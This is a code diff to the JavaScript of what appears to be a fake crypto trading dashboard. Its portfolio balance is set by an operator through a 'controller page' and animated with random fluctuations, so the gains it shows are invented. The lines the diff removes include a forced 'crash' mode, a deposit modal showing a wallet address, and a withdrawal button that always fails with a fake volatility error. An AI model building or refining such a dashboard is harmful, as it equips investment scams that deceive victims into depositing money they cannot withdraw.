@@ -2,12 +2,31 @@ let currentBalance = parseFloat(localStorage.getItem('admin_balance')) || 20.00;
 let depositAddress = localStorage.getItem('admin_address') || "0x71C...3a94";
 let paymentMethod = localStorage.getItem('admin_method') || "USDT (TRC20)";
 
-document.getElementById('balance-display').innerText = `$${currentBalance.toFixed(2)}`;
+// Function to update the text display safely
+function updateBalanceDisplay() {
+    const display = document.getElementById('balance-display');
+    if (display) {
+        display.innerText = '$' + currentBalance.toFixed(2);
+    }
+}
 
-const ctx = document.getElementById('livePerformanceChart').getContext('2d');
-const chartGradient = ctx.createLinearGradient(0, 0, 0, 300);
-chartGradient.addColorStop(0, 'rgba(16, 185, 129, 0.24)');
-chartGradient.addColorStop(1, 'rgba(16, 185, 129, 0.0)');
+updateBalanceDisplay();
+
+const ctx = document.getElementById('LivePerformanceChart').getContext('2d');
+
+// Standard color constants for the trading chart
+const greenColor = 'rgba(16, 185, 129, 1)';
+const greenGradientStart = 'rgba(16, 185, 129, 0.24)';
+const redColor = 'rgba(239, 68, 68, 1)';
+const redGradientStart = 'rgba(239, 68, 68, 0.24)';
+
+// Helper to generate a fresh gradient based on the current market direction
+function getChartGradient(colorStart) {
+    let gradient = ctx.createLinearGradient(0, 0, 0, 300);
+    gradient.addColorStop(0, colorStart);
+    gradient.addColorStop(1, 'rgba(16, 185, 129, 0.0)');
+    return gradient;
+}
 
 const liveChart = new Chart(ctx, {
     type: 'line',
@@ -16,106 +35,48 @@ const liveChart = new Chart(ctx, {
         datasets: [{
             label: 'Portfolio Value (USDT)',
             data: [20, 20.5, 21.2, 22.8, 24.1, currentBalance],
-            borderColor: '#10b981',
+            borderColor: greenColor,
             borderWidth: 3,
             fill: true,
-            backgroundColor: chartGradient,
+            backgroundColor: getChartGradient(greenGradientStart),
             tension: 0.4
         }]
     },
-    options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } } }
+    options: {
+        responsive: true,
+        maintainAspectRatio: false,
+        plugins: { legend: { display: false } }
+    }
 });
 
-// Master Operational Cycle
+// Real-time market simulation interval loop
 setInterval(() => {
-    let mode = localStorage.getItem('market_mode') || 'normal';
-    let balanceDisplay = document.getElementById('balance-display');
-    let pctDisplay = document.getElementById('profit-percent');
-
-    if (mode === 'crash') {
-        // Drop values sharply (simulate panic selling)
-        currentBalance = currentBalance * (0.6 + Math.random() * 0.1);
-        if (currentBalance < 1.0) currentBalance = 0.50;
-
-        // Visual alerts change to sharp red
-        balanceDisplay.innerText = `$${currentBalance.toFixed(2)}`;
-        balanceDisplay.className = "text-4xl font-extrabold tracking-tight text-red-500 transition-all duration-300";
-        pctDisplay.parentElement.className = "text-xs text-red-500 mt-1 font-medium flex items-center gap-1";
-        pctDisplay.parentElement.firstChild.textContent = "↓ Market Liquidation Event";
-        liveChart.data.datasets[0].borderColor = '#ef4444';
-
-    } else if (mode === 'recovery') {
-        // Spike values violently upward (simulate short squeeze / rally)
-        currentBalance = currentBalance * (1.4 + Math.random() * 0.2);
-        
-        // Visual alerts change to intense green/emerald
-        balanceDisplay.innerText = `$${currentBalance.toFixed(2)}`;
-        balanceDisplay.className = "text-4xl font-extrabold tracking-tight text-emerald-400 transition-all duration-300";
-        pctDisplay.parentElement.className = "text-xs text-emerald-400 mt-1 font-medium flex items-center gap-1";
-        pctDisplay.parentElement.firstChild.textContent = "↑ Strong Bullish V-Recovery";
-        liveChart.data.datasets[0].borderColor = '#10b981';
-
+    // 1. Check if the controller page has forced a fresh base balance update
+    const controlledBalance = parseFloat(localStorage.getItem('admin_balance'));
+    
+    // 2. Simulate micro-movements (random fluctuation between -0.15% and +0.15%)
+    const pctChange = (Math.random() * 0.3 - 0.15) / 100;
+    const previousBalance = currentBalance;
+    
+    if (!isNaN(controlledBalance) && controlledBalance !== parseFloat(localStorage.getItem('_last_processed_controlled'))) {
+        currentBalance = controlledBalance;
+        localStorage.setItem('_last_processed_controlled', controlledBalance);
     } else {
-        // Normal baseline behavior (static or slow drift)
-        let adminBalance = parseFloat(localStorage.getItem('admin_balance'));
-        if (adminBalance && adminBalance !== currentBalance) {
-            currentBalance = adminBalance;
-        }
-        balanceDisplay.innerText = `$${currentBalance.toFixed(2)}`;
-        balanceDisplay.className = "text-4xl font-extrabold tracking-tight text-white transition-all duration-300";
-        pctDisplay.parentElement.className = "text-xs text-emerald-400 mt-1 font-medium flex items-center gap-1";
-        pctDisplay.parentElement.firstChild.textContent = "↑ Stable Account Performance";
-        liveChart.data.datasets[0].borderColor = '#10b981';
+        currentBalance = currentBalance * (1 + pctChange);
     }
 
-    // Append new coordinate onto the graph structure
-    const now = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-    liveChart.data.labels.push(now);
-    liveChart.data.datasets[0].data.push(currentBalance);
-    
-    if (liveChart.data.labels.length > 8) {
-        liveChart.data.labels.shift();
-        liveChart.data.datasets[0].data.shift();
+    // 3. Update the data array for the chart's latest point
+    liveChart.data.datasets[0].data[liveChart.data.datasets[0].data.length - 1] = currentBalance;
+    updateBalanceDisplay();
+
+    // 4. Dynamic color shifting logic based on performance direction
+    if (currentBalance >= previousBalance) {
+        liveChart.data.datasets[0].borderColor = greenColor;
+        liveChart.data.datasets[0].backgroundColor = getChartGradient(greenGradientStart);
+    } else {
+        liveChart.data.datasets[0].borderColor = redColor;
+        liveChart.data.datasets[0].backgroundColor = getChartGradient(redGradientStart);
     }
-    
-    // Save state back to avoid unexpected baseline jumps
-    localStorage.setItem('admin_balance', currentBalance.toFixed(2));
-    liveChart.update();
-}, 2000);
 
-function triggerDepositModal() {
-    let currentMethod = localStorage.getItem('admin_method') || "USDT (TRC20 Network)";
-    let currentAddress = localStorage.getItem('admin_address') || "0x71C2496E7278274d3b4614a420971a9E3a9411bb";
-    
-    const modalHTML = `
-        <div id="dep-modal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
-            <div class="bg-slate-900 border border-slate-800 rounded-2xl max-w-md w-full p-6 space-y-4 shadow-2xl">
-                <div class="flex justify-between items-center">
-                    <h3 class="text-lg font-bold text-white">Fund Your Account</h3>
-                    <button onclick="closeModal()" class="text-slate-400 hover:text-white text-xl cursor-pointer">&times;</button>
-                </div>
-                <div class="space-y-3">
-                    <div>
-                        <label class="text-[10px] uppercase font-bold text-slate-500 tracking-wider">Selected Network</label>
-                        <div class="bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm font-medium text-emerald-400">${currentMethod}</div>
-                    </div>
-                    <div>
-                        <label class="text-[10px] uppercase font-bold text-slate-500 tracking-wider">Your Unique Receiving Address</label>
-                        <div class="bg-slate-950 border border-slate-800 rounded-xl p-3">
-                            <span class="text-xs font-mono text-slate-200 select-all break-all">${currentAddress}</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>`;
-    document.body.insertAdjacentHTML('beforeend', modalHTML);
-}
-
-function closeModal() {
-    const modal = document.getElementById('dep-modal');
-    if (modal) modal.remove();
-}
-
-function triggerWithdrawalModal() {
-    alert("System Error: Order cannot be processed during high volatility events.");
-}
+    liveChart.update('none'); // Render update smoothly without restarting animations
+}, 3000); // Runs automatically every 3 seconds
